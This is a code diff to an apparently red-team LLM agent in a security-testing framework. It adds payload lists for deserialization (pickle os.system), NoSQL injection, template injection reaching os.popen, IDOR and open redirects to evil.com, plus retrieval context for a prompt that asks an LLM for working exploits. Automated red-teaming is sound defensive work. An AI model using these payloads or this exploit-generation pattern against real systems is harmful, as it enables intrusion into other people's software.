@@ -35,9 +35,10 @@ class RedAgent(BaseLLMAgent):
         """Get Red Agent specific configuration."""
         return self.config.get('agents', {}).get('red_agent', {})
     
-    def __init__(self, config: Dict[str, Any]):
+    def __init__(self, config: Dict[str, Any], rag_retriever=None):
         """Initialize Red Agent."""
         super().__init__(config)
+        self.rag = rag_retriever
         
         self.attack_types = self.agent_config.get('attack_types', [
             'sql_injection',
@@ -92,6 +93,35 @@ class RedAgent(BaseLLMAgent):
                 "http://localhost:22",
                 "http://169.254.169.254/latest/meta-data/",
                 "http://[::]:80",
+            ],
+            'deserialization': [
+                "cos\nsystem\n(S'id'\ntR.",
+                "import pickle,os;pickle.dumps(type('E',(),{'__reduce__':lambda s:(os.system,('id',))})())",
+                "__import__('os').system('id')",
+            ],
+            'nosql_injection': [
+                '{"$gt": ""}',
+                '{"$ne": ""}',
+                '{"$regex": ".*"}',
+                '{"$where": "this.password.match(/.*/)"}',
+            ],
+            'ssti': [
+                "{{7*7}}",
+                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+                "${7*7}",
+                "{{''.__class__.__mro__[1].__subclasses__()}}",
+            ],
+            'idor': [
+                "1",
+                "2",
+                "999",
+                "../admin",
+            ],
+            'open_redirect': [
+                "//evil.com",
+                "https://evil.com",
+                "/\\evil.com",
+                "//evil%2Ecom",
             ],
         }
     
@@ -165,6 +195,17 @@ Focus on these vulnerability types:
 
 Think like a real attacker and be creative."""
 
+        # Extract vulnerability type from context if provided
+        vuln_type = context.split(': ')[1] if ':' in context else 'unknown'
+        
+        # Get memory context (success tracking)
+        memory_context = self.get_memory_context(vuln_type, n=3)
+        
+        # Get RAG context (intelligence)
+        rag_context = ""
+        if self.rag:
+            rag_context = self.rag.get_attack_context(code, vuln_type)
+
         user_prompt = f"""Analyze this {language} code for security vulnerabilities and generate a WORKING exploit:
 
 ```{language}
@@ -172,6 +213,9 @@ Think like a real attacker and be creative."""
 ```
 
 Context: {context if context else 'None provided'}
+
+{rag_context}
+{memory_context}
 
 Previous attacks tried: {', '.join(attack_history) if attack_history else 'None'}
 
@@ -286,7 +330,7 @@ Be specific and practical. The payload should be a real attack string, not pseud
         mutation = random.choice(mutations)
         try:
             return mutation(payload)[:self.max_payload_length]
-        except:
+        except Exception:
             return payload
     
     def analyze_code(self, code: str, language: str = 'python') -> List[Dict[str, Any]]:
